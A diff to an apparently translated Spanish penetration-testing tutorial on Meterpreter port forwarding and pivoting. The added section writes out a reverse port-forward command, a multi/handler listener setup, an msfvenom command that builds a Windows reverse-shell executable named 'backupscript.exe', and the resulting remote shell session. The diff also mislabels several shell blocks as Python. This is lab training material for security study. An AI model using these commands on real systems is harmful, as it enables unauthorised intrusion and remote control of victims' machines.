@@ -179,7 +179,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
 
 Túneles y reenvío de puertos de Meterpreter
 
-```
+```python
 meterpreter > help portfwd
 
 Usage: portfwd [-h] [add | delete | list | flush] [args]
@@ -200,7 +200,7 @@ OPTIONS:
 
 Túneles y reenvío de puertos de Meterpreter
 
-```shell-session
+```python
 meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
 
 [*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
@@ -212,6 +212,78 @@ El comando anterior solicita a la sesión de Meterpreter que inicie un detector 
 
 Túneles y reenvío de puertos de Meterpreter
 
-```shell-session
+```python
 G41i130Q@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
+```
+
+## Reenvío de puerto inverso de Meterpreter
+
+De manera similar a los reenvíos de puertos locales, Metasploit también puede realizar `reverse port forwarding`con el siguiente comando, donde es posible que desee escuchar en un puerto específico en el servidor comprometido y reenviar todos los shells entrantes desde el servidor Ubuntu a nuestro host de ataque. Iniciaremos un escucha en un nuevo puerto en nuestro host de ataque para Windows y solicitaremos al servidor Ubuntu que reenvíe todas las solicitudes recibidas al servidor Ubuntu en el puerto. `1234` a nuestro oyente en el puerto `8081`.
+
+Podemos crear un puerto inverso hacia adelante en nuestro shell existente del escenario anterior usando el siguiente comando. Este comando reenvía todas las conexiones en el puerto `1234` ejecutándose en el servidor Ubuntu a nuestro host de ataque en el puerto local ( `-l`) `8081`. También configuraremos nuestro oyente para escuchar en el puerto 8081 para un shell de Windows.
+
+#### Reglas de reenvío de puertos inversos
+
+Túneles y reenvío de puertos de Meterpreter
+
+```python
+meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+
+[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
+```
+
+#### Configuración e inicio de multi/handler
+
+Túneles y reenvío de puertos de Meterpreter
+
+```
+meterpreter > bg
+
+[*] Backgrounding session 1...
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LPORT 8081 
+LPORT => 8081
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
+LHOST => 0.0.0.0
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 0.0.0.0:8081 
+```
+
+Ahora podemos crear una carga útil de shell inverso que enviará una conexión de regreso a nuestro servidor Ubuntu en `172.16.5.129`: `1234`cuando se ejecuta en nuestro host de Windows. Una vez que nuestro servidor Ubuntu reciba esta conexión, la reenviará a `attack host's ip`: `8081` que configuramos.
+
+#### Generando la carga útil de Windows
+
+Túneles y reenvío de puertos de Meterpreter
+
+```shell-session
+G41i130Q@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: backupscript.exe
+```
+
+Finalmente, si ejecutamos nuestra carga útil en el host de Windows, deberíamos poder recibir un shell de Windows pivotado a través del servidor Ubuntu.
+
+#### Estableciendo la sesión de Meterpreter
+
+Túneles y reenvío de puertos de Meterpreter
+
+```shell-session
+[*] Started reverse TCP handler on 0.0.0.0:8081 
+[*] Sending stage (200262 bytes) to 10.10.14.18
+[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500
+
+meterpreter > shell
+Process 2336 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\>
 ```
